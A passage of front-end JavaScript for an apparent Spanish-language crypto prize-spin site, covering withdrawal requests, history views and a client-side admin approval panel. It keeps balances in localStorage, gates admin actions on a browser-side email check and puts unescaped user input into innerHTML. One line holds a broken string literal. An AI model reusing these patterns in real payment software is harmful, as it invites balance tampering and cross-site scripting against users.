                            Inicio: ${new Date(recording.startTime).toLocaleString()}
                            ${recording.endTime ? `- Fin: ${new Date(recording.endTime).toLocaleString()}` : ''}
                        </div>
                        <div class="space-y-2">
                            <h4 class="font-semibold">Resultados de los Giros:</h4>
                            ${recording.spins.map(spin => `
                                <div class="bg-gray-700 p-3 rounded">
                                    <div class="flex justify-between items-center">
                                        <span>Giro ${spin.spinNumber}</span>
                                        <span class="font-bold text-green-400">${spin.prize}</span>
                                    </div>
                                    <div class="text-sm text-gray-400">
                                        Ganador: ${spin.winner.userName} (Número ${spin.winner.number})
                                    </div>
                                    <div class="text-xs text-gray-500">
                                        ${new Date(spin.timestamp).toLocaleString()}
                                    </div>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                </div>
            `;
            document.body.appendChild(modal);
        }

        function loadRecordings() {
            const container = document.getElementById('recordingsContainer');
            container.innerHTML = '';
            
            recordings.forEach(recording => {
                const recordingEl = document.createElement('div');
                recordingEl.className = 'bg-gray-800 p-4 rounded-xl cursor-pointer hover:bg-gray-700 transition';
                recordingEl.onclick = () => showRecordingModal(recording);
                
                recordingEl.innerHTML = `
                    <div class="flex items-center gap-3 mb-2">
                        <i class="fas fa-video text-red-400"></i>
                        <h3 class="font-semibold">Sala #${recording.roomId}</h3>
                    </div>
                    <div class="text-sm text-gray-400">
                        <div>Fecha: ${new Date(recording.startTime).toLocaleDateString()}</div>
                        <div>Hora: ${new Date(recording.startTime).toLocaleTimeString()}</div>
                        <div>Giros: ${recording.spins.length}/3</div>
                    </div>
                    <div class="mt-2">
                        <div class="text-xs text-green-400">Click para ver detalles</div>
                    </div>
                `;
                
                container.appendChild(recordingEl);
            });
            
            if (recordings.length === 0) {
                container.innerHTML = '<div class="text-center text-gray-400 col-span-full">No hay grabaciones disponibles</div>';
            }
        }

        function requestWithdrawal() {
            const amount = parseFloat(document.getElementById('withdrawalAmount').value);
            const wallet = document.getElementById('withdrawalWallet').value;
            
            if (!amount || amount < 10) {
                showNotification('El monto mínimo de retiro es $10', 'error');
                return;
            }
            
            if (amount > currentUser.balance) {
                showNotification('Balance insuficiente', 'error');
                return;
            }
            
            if (!wallet) {
                showNotification('Ingresa una dirección de wallet válida', 'error');
                return;
            }
            
            // Create withdrawal request
            const withdrawal = {
                id: Date.now(),
                userId: currentUser.id,
                amount: amount,
                wallet: wallet,
                status: 'pending',
                requestDate: new Date().toISOString(),
                approvedDate: null,
                rejectedDate: null,
                rejectionReason: null
            };
            
            // Add to user's withdrawal history
            currentUser.withdrawalHistory.push(withdrawal);
            
            // Save to global withdrawals (for admin)
            let withdrawals = JSON.parse(localStorage.getItem('cryptospin_withdrawals') || '[]');
            withdrawals.push(withdrawal);
            localStorage.setItem('cryptospin_withdrawals', JSON.stringify(withdrawals));
            
            updateUserInStorage();
            updateWithdrawalHistory();
            
            // Clear form
            document.getElementById('withdrawalAmount').value = '';
            
            showNotification('Solicitud de retiro enviada. Será revisada por un administrador.', 'success');
        }

        function updateEarningsHistory() {
            const container = document.getElementById('earningsHistory');
            container.innerHTML = '';
            
            if (currentUser.earningsHistory.length === 0) {
                container.innerHTML = '<div class="text-gray-400 text-center">No tienes ganancias registradas</div>';
                return;
            }
            
            currentUser.earningsHistory.slice(-10).reverse().forEach(earning => {
                const earningEl = document.createElement('div');
                earningEl.className = 'bg-gray-700 p-3 rounded flex justify-between items-center';
                earningEl.innerHTML = `
                    <div>
                        <div class="font-semibold text-green-400">+${earning.amount}</div>
                        <div class="text-sm text-gray-400">Sala #${earning.roomId} - Giro ${earning.spinNumber}</div>
                    </div>
                    <div class="text-xs text-gray-500">
                        ${new Date(earning.timestamp).toLocaleDateString()}
                    </div>
                `;
                container.appendChild(earningEl);
            });
        }

        function updateWithdrawalHistory() {
            const container = document.getElementById('withdrawalHistory');
            container.innerHTML = '';
            
            if (currentUser.withdrawalHistory.length === 0) {
                container.innerHTML = '<div class="text-gray-400 text-center">No tienes retiros registrados</div>';
                return;
            }
            
            currentUser.withdrawalHistory.slice(-10).reverse().forEach(withdrawal => {
                const withdrawalEl = document.createElement('div');
                withdrawalEl.className = 'bg-gray-700 p-3 rounded';
                
                let statusClass = 'text-yellow-400';
                let statusText = 'Pendiente';
                
                if (withdrawal.status === 'approved') {
                    statusClass = 'text-green-400';
                    statusText = 'Aprobado';
                } else if (withdrawal.status === 'rejected') {
                    statusClass = 'text-red-400';
                    statusText = 'Rechazado';
                }
                
                withdrawalEl.innerHTML = `
                    <div class="flex justify-between items-center mb-2">
                        <div class="font-semibold">${withdrawal.amount}</div>
                        <div class="${statusClass} text-sm">${statusText}</div>
                    </div>
                    <div class="text-xs text-gray-400">
                        <div>Wallet: ${withdrawal.wallet.substring(0, 10)}...</div>
                        <div>Fecha: ${new Date(withdrawal.requestDate).toLocaleDateString()}</div>
                        ${withdrawal.rejectionReason ? `<div class="text-red-400 mt-1">Motivo: ${withdrawal.rejectionReason}</div>` : ''}
                    </div>
                `;
                container.appendChild(withdrawalEl);
            });
        }

        function updateUserInStorage() {
            const userIndex = users.findIndex(u => u.id === currentUser.id);
            if (userIndex !== -1) {
                users[userIndex] = currentUser;
                localStorage.setItem('cryptospin_users', JSON.stringify(users));
                localStorage.setItem('cryptospin_current_user', JSON.stringify(currentUser));
            }
        }

        function saveRooms() {
            localStorage.setItem('cryptospin_rooms', JSON.stringify(rooms));
        }

        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            notification.className = `fixed top-4 right-4 z-50 p-4 rounded-lg shadow-lg text-white max-w-sm ${
                type === 'success' ? 'bg-green-600' : 
                type === 'error' ? 'bg-red-600' : 
                'bg-blue-600'
            }`;
            notification.innerHTML = `
                <div class="flex items-center gap-2">
                    <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
                    <span>${message}</span>
                </div>
            `;
            
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.remove();
            }, 5000);
        }

        // Admin Panel (only for admin user)
        function initAdminPanel() {
            if (currentUser && currentUser.email === ADMIN_EMAIL) {
                // Add admin navigation
                const adminNav = document.createElement('li');
                adminNav.innerHTML = '<a href="#" class="nav-link block p-3 rounded hover:bg-gray-700" data-tab="admin"><i class="fas fa-shield-alt mr-2"></i>Panel Admin</a>';
                document.querySelector('nav ul').appendChild(adminNav);
                
                // Add admin section
                const adminSection = document.createElement('div');
                adminSection.id = 'adminSection';
                adminSection.className = 'tab-content';
                adminSection.innerHTML = `
                    <h2 class="text-2xl font-bold mb-6">Panel de Administración</h2>
                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
                        <div class="bg-gray-800 p-6 rounded-xl">
                            <h3 class="text-lg font-semibold mb-4">Solicitudes de Retiro Pendientes</h3>
                            <div id="pendingWithdrawals" class="space-y-3 max-h-64 overflow-y-auto">
                                <!-- Withdrawals will be loaded here -->
                            </div>
                        </div>
                        <div class="bg-gray-800 p-6 rounded-xl">
                            <h3 class="text-lg font-semibold mb-4">Estadísticas</h3>
                            <div class="space-y-3">
                                <div class="flex justify-between">
                                    <span>Total Usuarios:</span>
                                    <span id="totalUsers">0</span>
                                </div>
                                <div class="flex justify-between">
                                    <span>Salas Activas:</span>
                                    <span id="activeRooms">0</span>
                                </div>
                                <div class="flex justify-between">
                                    <span>Total Ganancias:</span>
                                    <span id="totalPlatformEarnings">$0</span>
                                </div>
                            </div>
                        </div>
                    </div>
                `;
                document.getElementById('mainContent').appendChild(adminSection);
                
                // Update navigation event listener
                document.querySelector('[data-tab="admin"]').addEventListener('click', (e) => {
                    e.preventDefault();
                    showTab('admin');
                    loadAdminData();
                });
            }
        }

        function loadAdminData() {
            if (currentUser && currentUser.email === ADMIN_EMAIL) {
                const withdrawals = JSON.parse(localStorage.getItem('cryptospin_withdrawals') || '[]');
                const pendingWithdrawals = withdrawals.filter(w => w.status === 'pending');
                
                const container = document.getElementById('pendingWithdrawals');
                container.innerHTML = '';
                
                pendingWithdrawals.forEach(withdrawal => {
                    const user = users.find(u => u.id === withdrawal.userId);
                    const withdrawalEl = document.createElement('div');
                    withdrawalEl.className = 'bg-gray-700 p-3 rounded';
                    withdrawalEl.innerHTML = `
                        <div class="flex justify-between items-center mb-2">
                            <div>
                                <div class="font-semibold">${user ? user.name : 'Usuario desconocido'}</div>
                                <div class="text-sm text-gray-400">${withdrawal.amount}</div>
                            </div>
                            <div class="flex gap-2">
                                <button onclick="approveWithdrawal(${withdrawal.id})" class="bg-green-600 px-3 py-1 rounded text-sm hover:bg-green-700">
                                    Aprobar
                                </button>
                                <button onclick="rejectWithdrawal(${withdrawal.id})" class="bg-red-600 px-3 py-1 rounded text-sm hover:bg-red-700">
                                    Rechazar
                                </button>
                            </div>
                        </div>
                        <div class="text-xs text-gray-500">
                            <div>Wallet: ${withdrawal.wallet}</div>
                            <div>Fecha: ${new Date(withdrawal.requestDate).toLocaleString()}</div>
                        </div>
                    `;
                    container.appendChild(withdrawalEl);
                });
                
                if (pendingWithdrawals.length === 0) {
                    container.innerHTML = '<div class="text-gray-400 text-center">No hay retiros pendientes</div>';
                }
                
                // Update stats
                document.getElementById('totalUsers').textContent = users.length;
                document.getElementById('activeRooms').textContent = rooms.filter(r => r.status === 'spinning').length;
                
                const totalEarnings = users.reduce((sum, user) => sum + (user.totalEarnings || 0), 0);
                document.getElementById('totalPlatformEarnings').textContent = ' + totalEarnings.toFixed(2);
            }
        }

        function approveWithdrawal(withdrawalId) {
            const withdrawals = JSON.parse(localStorage.getItem('cryptospin_withdrawals') || '[]');
            const withdrawal = withdrawals.find(w => w.id === withdrawalId);
            
            if (withdrawal) {
                withdrawal.status = 'approved';
                withdrawal.approvedDate = new Date().toISOString();
                
                // Update user's balance
                const user = users.find(u => u.id === withdrawal.userId);
                if (user) {
                    user.balance -= withdrawal.amount;
                    const userIndex = users.findIndex(u => u.id === withdrawal.userId);
                    users[userIndex] = user;
                    localStorage.setItem('cryptospin_users', JSON.stringify(users));
                    
                    // Update user's withdrawal history
                    const userWithdrawal = user.withdrawalHistory.find(w => w.id === withdrawalId);
                    if (userWithdrawal) {
                        userWithdrawal.status = 'approved';
                        userWithdrawal.approvedDate = withdrawal.approvedDate;
                    }
                }
                
                localStorage.setItem('cryptospin_withdrawals', JSON.stringify(withdrawals));
                loadAdminData();
                showNotification('Retiro aprobado exitosamente', 'success');
            }
        }

        function rejectWithdrawal(withdrawalId) {
            const reason = prompt('Motivo del rechazo:');
            if (!reason) return;
            
            const withdrawals = JSON.parse(localStorage.getItem('cryptospin_withdrawals') || '[]');
            const withdrawal = withdrawals.find(w => w.id === withdrawalId);
            
            if (withdrawal) {
                withdrawal.status = 'rejected';
                withdrawal.rejectedDate = new Date().toISOString();
                withdrawal.rejectionReason = reason;
                
                // Update user's withdrawal history
                const user = users.find(u => u.id === withdrawal.userId);
                if (user) {
                    const userWithdrawal = user.withdrawalHistory.find(w => w.id === withdrawalId);
                    if (userWithdrawal) {
                        userWithdrawal.status = 'rejected';
                        userWithdrawal.rejectedDate = withdrawal.rejectedDate;
                        userWithdra
